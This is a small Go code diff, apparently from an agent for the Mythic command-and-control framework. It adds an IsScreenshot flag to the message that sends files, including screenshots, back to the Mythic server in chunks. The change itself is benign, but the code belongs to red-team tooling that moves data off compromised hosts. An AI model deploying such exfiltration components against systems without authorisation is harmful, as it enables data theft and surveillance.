@@ -58,6 +58,7 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 	fileDownloadData := structs.FileDownloadMessage{}
 	fileDownloadData.TotalChunks = int(chunks)
 	fileDownloadData.FullPath = sendFileToMythic.FullPath
+	fileDownloadData.IsScreenshot = sendFileToMythic.IsScreenshot
 
 	if sendFileToMythic.FullPath != "" {
 		abspath, err := filepath.Abs(sendFileToMythic.FullPath)
